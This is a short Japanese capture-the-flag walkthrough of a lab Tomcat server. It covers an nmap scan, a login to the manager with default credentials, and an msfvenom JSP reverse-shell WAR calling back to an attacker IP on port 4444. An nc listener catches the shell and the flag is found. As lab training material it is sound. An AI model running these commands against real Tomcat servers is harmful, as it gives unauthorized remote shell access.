# 1.Port Scan
ip=10.10.10.95

nmap -sC -sV -Pn $ip

![e48a06e5a49dd10ebdfcba2b5a970b96.png](../_resources/e48a06e5a49dd10ebdfcba2b5a970b96.png)

http://$ip:8080

![f62ad70d3dcb2eb92a5c54a5daf093cc.png](../_resources/f62ad70d3dcb2eb92a5c54a5daf093cc.png)

Username:admin
Password:password 

上記でログイン

ログインに失敗したがユーザネームとパスワードを取得

![454dcba5050a4c993c91d4cf6fd6bc9a.png](../_resources/454dcba5050a4c993c91d4cf6fd6bc9a.png)

各種ページにログイン成功

Sarver Status

![51ee760731f467c4ef813f8a9b172ebc.png](../_resources/51ee760731f467c4ef813f8a9b172ebc.png)

Tomcat Web Application Manager

![e7b3547f0928df3dfbc2d9c1b89b600c.png](../_resources/e7b3547f0928df3dfbc2d9c1b89b600c.png)

Host Manager はログイン失敗

![3bbc1a9f3d49c0a6e6f164222a6263b0.png](../_resources/3bbc1a9f3d49c0a6e6f164222a6263b0.png)

ヴェノムフレームワークでシェルコードを作成

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f war > shell.war`   

![58b892a5acc1c06fe079a3175ebdebd5.png](../_resources/58b892a5acc1c06fe079a3175ebdebd5.png)

作成したシェルをアップロード

![13211903b2461f56524051c8e43eca97.png](../_resources/13211903b2461f56524051c8e43eca97.png)

shellディレクトリを作成される

![0d9ea9d7d23bb4da440c56393ba90751.png](../_resources/0d9ea9d7d23bb4da440c56393ba90751.png)

ポートを解放する

`nc -lvnp 4444`

作成したshellディレクトリにアクセス

![e23114c44995267e495fdd88928c80b4.png](../_resources/e23114c44995267e495fdd88928c80b4.png)

tomcat サーバへ接続

![926732426503fcc3a3b7540196be3e58.png](../_resources/926732426503fcc3a3b7540196be3e58.png)

flagを発見

![300b720ec2cb2ca5d3c17317cdd27c44.png](../_resources/300b720ec2cb2ca5d3c17317cdd27c44.png)